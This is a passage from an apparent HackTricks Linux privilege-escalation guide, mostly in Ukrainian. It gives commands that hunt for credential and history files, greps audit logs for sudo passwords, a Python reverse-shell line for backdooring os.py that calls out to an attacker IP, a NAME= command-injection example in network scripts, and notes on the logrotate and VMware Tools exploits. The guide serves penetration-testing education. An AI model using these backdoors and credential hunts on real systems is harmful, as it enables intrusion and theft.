### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Перегляньте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — це додаток з відкритим кодом, який використовується для отримання великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Logs

Якщо ви можете читати logs, ви можете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший log, тим цікавішим він буде (ймовірно).\
Також деякі "**bad**" configured (backdoored?) **audit logs** можуть дозволити вам **записувати паролі** всередині audit logs, як пояснено в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб **читати логи, група** [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Загальний пошук Creds/Regex

Вам також слід перевіряти файли, що містять слово "**password**" у своїй **назві** або в **змісті**, а також перевіряти IPs і emails у логах, або хеші за допомогою regexps.\
Я не збираюся перелічувати тут, як усе це робити, але якщо вас цікавить, ви можете переглянути останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте, **звідки** буде виконано python script і ви **можете записувати в** ту папку, або можете **modify python libraries**, ви можете змінити OS library і backdoor її (якщо ви можете писати там, де буде виконуватися python script, скопіюйте та вставте бібліотеку os.py).

Щоб **backdoor the library**, просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Уразливість у `logrotate` дозволяє користувачам з **правами запису** до лог-файлу або його батьківських директорій потенційно отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто запускається як **root**, можна маніпулювати для виконання довільних файлів, особливо в директоріях на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, а й у будь-якій директорії, де застосовується ротація логів.

> [!TIP]
> Ця вразливість стосується версії `logrotate` `3.18.0` і старіших

Більш детальну інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю вразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зауважте пробіл між Network та /bin/id_)

### **init, init.d, systemd, and rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами Linux**. Він включає скрипти для `start`, `stop`, `restart` та іноді `reload` сервісів. Їх можна виконувати напряму або через символічні посилання в `/etc/rc?.d/`. Альтернативний шлях у Redhat — `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов’язаний з **Upstart**, новішою системою **service management**, запровадженою Ubuntu, яка використовує конфігураційні файли для керування сервісами. Незважаючи на перехід до Upstart, SysVinit-скрипти все ще використовуються разом із конфігураціями Upstart завдяки сумісному шару в Upstart.

**systemd** — сучасний інструмент ініціалізації та менеджменту сервісів, що пропонує розширені можливості, такі як запуск демонів за потреби, керування automount та знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутиву та `/etc/systemd/system/` для змін адміністратора, спрощуючи адміністрування системи.

## Інші прийоми

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай hook a syscall, щоб відкрити привілейовану функціональність kernel для userspace manager. Слабка аутентифікація manager'а (наприклад, перевірки підписів на основі FD-order або погані схеми паролів) може дозволити локальному додатку видавати себе за manager і escalate to root на пристроях, що вже мають root. Деталі та методи експлуатації тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery в VMware Tools/Aria Operations може витягти шлях до бінарника з command line процесів та виконати його з прапором -v у привілейованому контексті. Дозволяючі шаблони (наприклад, використання \S) можуть співпасти з attacker-staged listeners у записуваних локаціях (наприклад, /tmp/httpd), що призводить до execution as root (CWE-426 Untrusted Search Path).

Детальніше та узагальнену схему, застосовну до інших discovery/monitoring stacks, див. тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захист ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Більше допомоги

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
